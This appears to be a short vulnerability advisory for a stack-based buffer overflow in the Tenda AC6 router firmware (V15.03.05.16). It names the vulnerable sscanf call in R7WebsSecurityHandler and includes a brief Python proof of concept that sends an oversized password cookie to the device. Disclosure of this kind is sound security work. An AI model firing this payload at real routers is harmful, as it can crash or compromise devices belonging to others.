# Tenda-Vul
Product:
Tenda AC6

Version:
V15.03.05.16
https://www.tenda.com.cn/material/show/102661

Problem Type:
Stack overflow
Description:
A vulnerability classified as critical has been found in Tenda AC6 15.03.05.16. Affected is the function R7WebsSecurityHandler of the file /goform/xxx. The manipulation of the argument password leads to stack-based buffer overflow. It is possible to launch the attack remotely. The exploit has been disclosed to the public and may be used. Other parameters might be affected as well.

Detial:
At the function of R7WebsSecurityHandler line 94：sscanf(v44, "%*[^=]=%[^;];*", v34).This function does not validate the user input.Copy user input directly into the stack.

POC:
import requests
URL = "http://192.168.2.3:80/goform/helloworld"
cookie = {"Cookie":"password="+"a"*0x400+".pngAAA"}
requests.get(url=URL, cookies=cookie)

![image](https://github.com/user-attachments/assets/c1a89751-2276-4f9b-be2a-1fba6a3be880)
